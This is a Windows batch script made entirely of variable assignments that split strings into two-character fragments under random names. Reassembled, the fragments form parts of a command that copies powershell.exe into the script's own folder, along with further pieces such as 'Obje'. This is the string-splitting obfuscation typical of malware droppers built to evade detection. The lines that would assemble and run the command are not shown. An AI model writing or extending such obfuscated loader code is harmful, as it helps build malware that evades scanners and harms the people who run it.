@echo off
set "MWwVXIyMWd=rs"
set "sRRcIqsLmb=nd"
set "cnThFriKSn=y "
set "yItfTuTlDT=.e"
set "WQLgOBfNdb=s\"
set "jLmvBUFlSP=ll"
set "BBYWdBPOIF=rS"
set "OIeofCfLnh=em"
set "grVfytDDAC=we"
set "kvuIJFwbcF=0\"
set "fbcWGIzeBe=xe"
set "kFIkBjgPhN=32"
set "PfEfBHvVik=ws"
set "CRDlRJoVIU=py"
set "fKxbUMMgDb=Wi"
set "rjPLhaXecp=ow"
set "rgnifUDEWS=\W"
set "SVfWUxjyGi=ll"
set "lDOYOmoHaW= C"
set "oYDJIDtcGa=do"
set "YBPvARLxXJ=Po"
set "GtTknRdOTc=in"
set "AidZEuJQRT=Sy"
set "eTWXMaKbud= /"
set "rqhABDNZaG=po"
set "bXOroXLmbL=1."
set "TgJaoGRPIt=co"
set "dSvGJwDSrZ=\v"
set "kqQjPUhNIW=we"
set "jbmhjVVMTT=st"
set "viGJdNjhiR=he"
set "aBQLILQnQL=he"
set "lBTzjBNyjB=:\"
set "FpPqodyqIO= %~dp0"
set "pvBlvMeOBp=cd"
set "bgmTLcXDub=Bmor"
set "HwgDQzXMMS=Obje"
